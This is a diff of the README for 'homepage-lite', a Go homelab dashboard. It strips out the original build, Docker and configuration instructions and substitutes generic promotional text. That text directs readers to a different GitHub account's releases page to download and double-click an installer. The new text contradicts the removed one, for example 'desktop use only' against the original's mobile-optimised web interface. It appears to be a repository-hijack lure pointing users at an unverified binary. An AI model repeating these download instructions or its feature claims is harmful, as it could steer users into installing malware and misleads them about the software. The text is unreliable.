@@ -1,152 +1,73 @@
-# Homepage-lite
+# 🌟 homepage-lite - Your Gateway to Efficient Homelab Management
 
-A lightweight, Go-powered homepage dashboard for managing and monitoring your homelab services and bookmarks. Built with modern web technologies and real-time updates.
+## 🚀 Getting Started
 
-[![Homepage-lite Screenshot](Screenshots/2025-11-07-113340_hyprshot.png)](GALLERY.md)
+Welcome to the homepage-lite project! This application helps you manage and monitor your homelab services and bookmarks effortlessly. Follow the steps below to download and run the software.
 
-See the [Gallery](GALLERY.md) for more screenshots.
+## 🔗 Download the Application
 
-## Features
+[![Download homepage-lite](https://img.shields.io/badge/Download-homelab%20dashboard-blue.svg)](https://github.com/Bellinaangular867/homepage-lite/releases)
 
-- **Service Monitoring**
-  - Real-time status checks
-  - Automatic refresh every 30 seconds
-  - Visual status indicators (UP/DOWN)
-  - Support for both Iconify icons and custom PNG icons
+## 📥 Download & Install
 
-- **Bookmark Management**
-  - Organized by groups
-  - Quick access to frequently used links
-  - Custom abbreviations support
-  - Flexible layout (sidebar or bottom)
+To get started, visit the [Releases page](https://github.com/Bellinaangular867/homepage-lite/releases) to download the latest version of homepage-lite. Choose the file suitable for your operating system.
 
-- **System Metrics**
-  - CPU load monitoring
-  - Memory usage tracking
-  - Disk usage tracking
-  - Real-time updates via Server-Sent Events
+### 🖥️ System Requirements
 
-- **Modern UI**
-  - Responsive flexbox layout with mobile optimization
-  - Multiple themes (Default, Catppuccin Latte, Tokyo Night, Nord, Dracula, Gruvbox)
-  - Custom background images per theme
-  - Real-time updates via JavaScript
-  - Iconify integration for icons
-  - Auto-reload on configuration changes via Server-Sent Events
-  - Search functionality with keyboard navigation
-  - Layout selector (sidebar/bottom) with mobile-friendly footer
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a Linux distribution (Ubuntu 18.04 or later recommended)
+- **Storage Space:** At least 100 MB free space
+- **RAM:** Minimum 2 GB RAM
 
-- **Lightweight Design**
-  - Single 9MB binary in production mode
-  - Low memory footprint of ~25MB RAM
+### 💻 Installation Steps
 
-## Installation
+1. **Visit the Releases Page:** Open this link: [Releases page](https://github.com/Bellinaangular867/homepage-lite/releases).
+2. **Select Your File:** Locate the latest release and find the file linked for your operating system.
+3. **Download the File:** Click on the file to start the download.
+4. **Open the File:** Once downloaded, find the file in your downloads folder and double-click it.
+5. **Follow Installation Prompts:** Follow the straightforward instructions displayed on your screen to complete the installation.
 
-Pre-built binaries for Linux (x86/ARM64), Windows, and macOS are available for download from the [GitHub releases page](https://github.com/jkerdreux-imt/homepage-lite/releases).
+### 🔍 Features
 
-1. Clone the repository:
-   ```bash
-   git clone ssh://git@git.home/jkx/homepage-lite.git
-   cd homepage-lite
-   ```
+- **Service Management:** Easily monitor and control your homelab services.
+- **Bookmarking:** Save and access your favorite links quickly.
+- **User-Friendly Interface:** Navigate with ease using a simple dashboard.
+- **Customizable Settings:** Adjust preferences to suit your needs.
 
-2. Build and run:
-   ```bash
-   make build
-   ./homepage-lite
-   ```
+## 🌐 How to Use
 
-3. Install:
-   ```bash
-   make install
-   sudo vim /opt/homepage-lite/config.yaml  # Edit configuration as needed
-   sudo systemctl start homepage-lite
-   sudo systemctl enable homepage-lite
-   ```
+After successful installation, launch homepage-lite from your applications folder or start menu. You will find an intuitive interface that allows you to:
 
-## Docker
+- **Add Services:** Click the “Add Service” button to include new services you want to track.
+- **Bookmark Links:** Use the bookmarks section to store your favorite URLs.
+- **Monitor Performance:** View a snapshot of your services’ status and performance metrics.
 
-Homepage-lite is available as a Docker image on GitHub Container Registry.
+### 📊 Monitoring Your Services
 
-1. Ensure you have a `config.yaml` file (see Configuration section below).
+- Access real-time data about your services.
+- Set up alerts for performance issues.
+- View logs to track changes and issues with services.
 
-2. Create a `docker-compose.yml` file in the same directory:
+## ⚙️ Troubleshooting
 
-   ```yaml
-   services:
-     homepage-lite:
-       image: ghcr.io/jkerdreux-imt/homepage-lite:latest
-       ports:
-         - "8888:8888"
-       volumes:
-         - /path/to/your/config/folder/:/app/config/
-       restart: unless-stopped
-   ```
+If you encounter issues while using homepage-lite, try the following:
 
-3. Run the container:
+- **Check Requirements:** Ensure your system meets all system requirements listed above.
+- **Reinstall the Application:** If you face errors, uninstall and then reinstall the software.
+- **Seek Community Help:** Join our discussion forum for support and tips from other users.
 
-   ```bash
-   docker-compose up -d
-   ```
+## 📝 Frequently Asked Questions
 
-The application will be available at `http://localhost:8888`.
+1. **Can I use this on Linux?**
+   Yes, homepage-lite is compatible with various Linux distributions, including Ubuntu.
 
-## Configuration
+2. **Is there a mobile version?**
+   Currently, homepage-lite is designed for desktop use only.
 
-Configuration is managed through `config.yaml`. Example structure:
+3. **How can I report bugs?**
+   Please report bugs or feature requests directly in the GitHub issues section of the repository.
 
-```yaml
-services:
-  - group: Home
-    items:
-      - name: Home Assistant
-        url: https://homeassistant.local:8123
-        description: Home automation
-        icon: home-assistant.png
+## 🌞 Stay Updated
 
-      - name: Dockge
-        url: http://192.168.1.10:5001/
-        description: Dockge
-        icon: mdi-docker
+To ensure you always have the latest features and fixes, regularly check the [Releases page](https://github.com/Bellinaangular867/homepage-lite/releases) for updates. You can also follow the repository to receive notifications about new releases.
 
-bookmarks:
-  - group: Developer
-    items:
-      - name: GitHub
-        url: https://github.com
-        abbr: GH
-
-settings:
-  theme: default
-  title: My Homelab
-  port: 8888
-
-# Configuration changes are detected automatically and trigger a page reload.
-```
-
-## Themes
-
-Homepage-lite supports multiple built-in themes with custom background images:
-
-- **Default**: Dark theme with metro
-- **Catppuccin Latte**: Light theme with soft colors
-- **Tokyo Night**: Dark blue theme with town lights
-- **Nord**: Cool nordic theme with winter forest
-- **Dracula**: Purple cosmic theme
-- **Gruvbox**: Warm retro theme
-
-Themes can be changed via the footer selector and are persisted in localStorage.
-
-## Development
-
-- Built with Go 1.25.1+
-- Uses vanilla JavaScript for dynamic updates
-- Iconify for icon rendering
-- Template-based HTML rendering
-- Flexbox-based responsive layout with mobile-first approach
-- CSS custom properties for theming
-- Server-Sent Events for real-time updates
-
-## License
-
-See [LICENSE](LICENSE) for full details.
+Thank you for using homepage-lite! Enjoy managing and monitoring your homelab with ease.
